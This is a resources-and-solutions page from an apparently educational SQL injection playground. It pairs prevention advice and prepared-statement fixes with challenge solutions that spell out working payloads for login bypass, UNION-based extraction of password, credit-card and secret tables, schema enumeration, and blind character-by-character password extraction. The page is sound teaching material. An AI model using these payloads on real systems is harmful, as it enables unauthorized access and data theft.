<?php
require_once 'config.php';
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Resources & Solutions - SQL Injection Playground</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">
    <style>
        .header {
            background-color: #f8f9fa;
            padding: 20px 0;
            margin-bottom: 40px;
            border-bottom: 1px solid #e7e7e7;
        }
        .solution-box {
            background-color: #d1e7dd;
            border-left: 4px solid #198754;
            padding: 15px;
            margin-bottom: 20px;
        }
        .warning-box {
            background-color: #f8d7da;
            border-left: 4px solid #dc3545;
            padding: 15px;
            margin-bottom: 20px;
        }
        pre {
            background-color: #f8f9fa;
            padding: 10px;
            border-radius: 5px;
            overflow-x: auto;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="container">
            <div class="d-flex justify-content-between align-items-center">
                <h1>Resources & Solutions</h1>
                <a href="index.php" class="btn btn-outline-secondary">Back to Home</a>
            </div>
        </div>
    </div>

    <div class="container">
        <div class="row">
            <div class="col-lg-8">
                <div class="card mb-4">
                    <div class="card-header bg-secondary text-white">
                        <h5 class="mb-0">What is SQL Injection?</h5>
                    </div>
                    <div class="card-body">
                        <p>SQL Injection is a code injection technique that exploits vulnerabilities in applications that interact with databases. It occurs when user input is directly incorporated into SQL queries without proper sanitization or validation.</p>
                        
                        <p>These attacks can allow malicious users to:</p>
                        <ul>
                            <li>Access unauthorized data</li>
                            <li>Bypass authentication</li>
                            <li>Execute administrative operations on the database</li>
                            <li>In some cases, issue commands to the operating system</li>
                        </ul>
                        
                        <div class="warning-box">
                            <h5>Legal Warning:</h5>
                            <p>Using SQL Injection techniques on websites without explicit permission is illegal in most jurisdictions and could lead to serious legal consequences.</p>
                            <p>This application is designed solely for educational purposes to understand how these vulnerabilities work and how to prevent them.</p>
                        </div>
                    </div>
                </div>
                
                <div class="card mb-4">
                    <div class="card-header bg-success text-white">
                        <h5 class="mb-0">Solutions to Prevent SQL Injection</h5>
                    </div>
                    <div class="card-body">
                        <h5>1. Use Prepared Statements with Parameterized Queries</h5>
                        <p>The most effective way to prevent SQL injection is to separate SQL code from data:</p>
                        
                        <div class="solution-box">
                            <h6>Vulnerable Code:</h6>
                            <pre><code>$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";</code></pre>
                            
                            <h6>Secure Code with Prepared Statements:</h6>
                            <pre><code>// Using mysqli
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();

// Using PDO
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
$result = $stmt->fetch();</code></pre>
                        </div>
                        
                        <h5>2. Use Database-Specific Escaping Functions</h5>
                        <p>When prepared statements aren't possible, use escaping functions specific to your database:</p>
                        
                        <div class="solution-box">
                            <pre><code>// For MySQL
$username = mysqli_real_escape_string($conn, $username);
$sql = "SELECT * FROM users WHERE username = '$username'";</code></pre>
                        </div>
                        
                        <h5>3. Validate and Sanitize User Input</h5>
                        <p>Always validate that user input matches the expected type and format:</p>
                        
                        <div class="solution-box">
                            <pre><code>// For numeric inputs
if (!is_numeric($id)) {
    die("Invalid input");
}
$sql = "SELECT * FROM products WHERE id = " . (int)$id;</code></pre>
                        </div>
                        
                        <h5>4. Apply Least Privilege Principle</h5>
                        <p>Use database accounts with minimal privileges required for the application.</p>
                        
                        <h5>5. Use ORM Libraries</h5>
                        <p>Object-Relational Mapping libraries often have built-in protection against SQL injection.</p>
                    </div>
                </div>
                
                <div class="card mb-4">
                    <div class="card-header bg-info text-white">
                        <h5 class="mb-0">Solutions to the Challenges</h5>
                    </div>
                    <div class="card-body">
                        <div class="accordion" id="solutionsAccordion">
                            <!-- Level 1 Solution -->
                            <div class="accordion-item">
                                <h2 class="accordion-header" id="headingOne">
                                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseOne" aria-expanded="false" aria-controls="collapseOne">
                                        Level 1: Login Bypass Solution
                                    </button>
                                </h2>
                                <div id="collapseOne" class="accordion-collapse collapse" aria-labelledby="headingOne" data-bs-parent="#solutionsAccordion">
                                    <div class="accordion-body">
                                        <p>To bypass the login, you can use input like:</p>
                                        <pre><code>Username: admin' --
Password: anything</code></pre>
                                        
                                        <p>Or:</p>
                                        <pre><code>Username: admin' OR '1'='1
Password: anything</code></pre>
                                        
                                        <p>The resulting query becomes:</p>
                                        <pre><code>SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'</code></pre>
                                        <p>Everything after the <code>--</code> is treated as a comment and ignored.</p>
                                        
                                        <div class="solution-box">
                                            <h6>Secure Implementation:</h6>
                                            <pre><code>$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();</code></pre>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            <!-- Level 2 Solution -->
                            <div class="accordion-item">
                                <h2 class="accordion-header" id="headingTwo">
                                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseTwo" aria-expanded="false" aria-controls="collapseTwo">
                                        Level 2: String-based Injection Solution
                                    </button>
                                </h2>
                                <div id="collapseTwo" class="accordion-collapse collapse" aria-labelledby="headingTwo" data-bs-parent="#solutionsAccordion">
                                    <div class="accordion-body">
                                        <p>First, determine the number of columns using ORDER BY:</p>
                                        <pre><code>laptop' ORDER BY 5 -- </code></pre>
                                        
                                        <p>Then use UNION to extract data from other tables:</p>
                                        <pre><code>laptop' UNION SELECT id, username, password, email, is_admin FROM users -- </code></pre>
                                        
                                        <p>To extract data from the secrets table:</p>
                                        <pre><code>laptop' UNION SELECT id, secret_key, secret_value, NULL, NULL FROM secrets -- </code></pre>
                                        
                                        <div class="solution-box">
                                            <h6>Secure Implementation:</h6>
                                            <pre><code>$stmt = $conn->prepare("SELECT * FROM products WHERE name LIKE ? OR description LIKE ?");
$search_term = "%$search_term%";
$stmt->bind_param("ss", $search_term, $search_term);
$stmt->execute();
$result = $stmt->get_result();</code></pre>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            <!-- Level 3 Solution -->
                            <div class="accordion-item">
                                <h2 class="accordion-header" id="headingThree">
                                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseThree" aria-expanded="false" aria-controls="collapseThree">
                                        Level 3: Numeric Injection Solution
                                    </button>
                                </h2>
                                <div id="collapseThree" class="accordion-collapse collapse" aria-labelledby="headingThree" data-bs-parent="#solutionsAccordion">
                                    <div class="accordion-body">
                                        <p>Basic techniques to exploit numeric SQL injection:</p>
                                        <pre><code>1 OR 1=1</code></pre>
                                        
                                        <p>To extract data from the customers table:</p>
                                        <pre><code>1 UNION SELECT id, name, email, credit_card, address FROM customers</code></pre>
                                        
                                        <p>To extract data from the secrets table:</p>
                                        <pre><code>1 UNION SELECT id, secret_key, secret_value, NULL, NULL FROM secrets</code></pre>
                                        
                                        <div class="solution-box">
                                            <h6>Secure Implementation:</h6>
                                            <pre><code>$id = (int)$_GET['id']; // Cast to integer
$stmt = $conn->prepare("SELECT * FROM products WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
$result = $stmt->get_result();</code></pre>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            <!-- Level 4 Solution -->
                            <div class="accordion-item">
                                <h2 class="accordion-header" id="headingFour">
                                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseFour" aria-expanded="false" aria-controls="collapseFour">
                                        Level 4: Blind SQL Injection Solution
                                    </button>
                                </h2>
                                <div id="collapseFour" class="accordion-collapse collapse" aria-labelledby="headingFour" data-bs-parent="#solutionsAccordion">
                                    <div class="accordion-body">
                                        <p>To extract admin's password using blind SQL injection:</p>
                                        <pre><code>admin' AND SUBSTRING(password,1,1)='a' -- </code></pre>
                                        
                                        <p>If "Username exists" is returned, the first character is 'a'. Continue with each position:</p>
                                        <pre><code>admin' AND SUBSTRING(password,2,1)='d' -- </code></pre>
                                        
                                        <p>You can also use ASCII values:</p>
                                        <pre><code>admin' AND ASCII(SUBSTRING(password,1,1))=97 -- </code></pre>
                                        
                                        <div class="solution-box">
                                            <h6>Secure Implementation:</h6>
                                            <pre><code>$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
$result = $stmt->get_result();
return ($result && mysqli_num_rows($result) > 0);</code></pre>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            <!-- Level 5 Solution -->
                            <div class="accordion-item">
                                <h2 class="accordion-header" id="headingFive">
                                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseFive" aria-expanded="false" aria-controls="collapseFive">
                                        Level 5: UNION-based Injection Solution
                                    </button>
                                </h2>
                                <div id="collapseFive" class="accordion-collapse collapse" aria-labelledby="headingFive" data-bs-parent="#solutionsAccordion">
                                    <div class="accordion-body">
                                        <p>To extract usernames and passwords:</p>
                                        <pre><code>Electronics' UNION SELECT id, username, password, 0, email FROM users -- </code></pre>
                                        
                                        <p>To get database version:</p>
                                        <pre><code>Electronics' UNION SELECT 1, 2, @@version, 4, 5 -- </code></pre>
                                        
                                        <p>To list all tables:</p>
                                        <pre><code>Electronics' UNION SELECT 1, table_name, table_schema, 4, 5 FROM information_schema.tables WHERE table_schema=DATABASE() -- </code></pre>
                                        
                                        <p>To extract data from secrets table:</p>
                                        <pre><code>Electronics' UNION SELECT id, secret_key, secret_value, 0, 'Secret' FROM secrets -- </code></pre>
                                        
                                        <div class="solution-box">
                                            <h6>Secure Implementation:</h6>
                                            <pre><code>$stmt = $conn->prepare("SELECT id, name, description, price, category FROM products WHERE category = ?");
$stmt->bind_param("s", $category);
$stmt->execute();
$result = $stmt->get_result();</code></pre>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-4">
                <div class="card mb-4">
                    <div class="card-header bg-primary text-white">
                        <h5 class="mb-0">Additional Resources</h5>
                    </div>
                    <div class="card-body">
                        <h5>Learn More About SQL Injection</h5>
                        <ul>
                            <li><a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">OWASP SQL Injection Guide</a></li>
                            <li><a href="https://portswigger.net/web-security/sql-injection" target="_blank">PortSwigger Web Security Academy</a></li>
                            <li><a href="https://www.w3schools.com/sql/sql_injection.asp" target="_blank">W3Schools SQL Injection Tutorial</a></li>
                        </ul>
                        
                        <h5>Practice Platforms</h5>
                        <ul>
                            <li><a href="https://portswigger.net/web-security/all-labs#sql-injection" target="_blank">PortSwigger Web Security Labs</a></li>
                            <li><a href="https://www.hacksplaining.com/exercises/sql-injection" target="_blank">Hacksplaining: SQL Injection</a></li>
                            <li><a href="https://tryhackme.com/room/sqlilab" target="_blank">TryHackMe: SQL Injection Lab</a></li>
                        </ul>
                        
                        <h5>SQL Injection Prevention</h5>
                        <ul>
                            <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" target="_blank">OWASP SQL Injection Prevention Cheat Sheet</a></li>
                            <li><a href="https://www.php.net/manual/en/security.database.sql-injection.php" target="_blank">PHP Manual: SQL Injection</a></li>
                        </ul>
                    </div>
                </div>
                
                <div class="card">
                    <div class="card-header bg-danger text-white">
                        <h5 class="mb-0">Ethical Hacking Reminder</h5>
                    </div>
                    <div class="card-body">
                        <p>Remember that ethical hackers:</p>
                        <ul>
                            <li>Only test systems they have explicit permission to test</li>
                            <li>Respect the scope of engagement</li>
                            <li>Report vulnerabilities responsibly</li>
                            <li>Do not damage systems or exfiltrate sensitive data</li>
                            <li>Follow the law at all times</li>
                        </ul>
                        <p>This educational tool is meant to help you understand vulnerabilities so you can build more secure applications, not to facilitate illegal activities.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <footer class="mt-5 py-3 bg-light">
        <div class="container text-center">
            <p class="text-muted mb-0">Created for educational purposes only. Do not use these techniques on real websites without permission.</p>
        </div>
    </footer>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html> 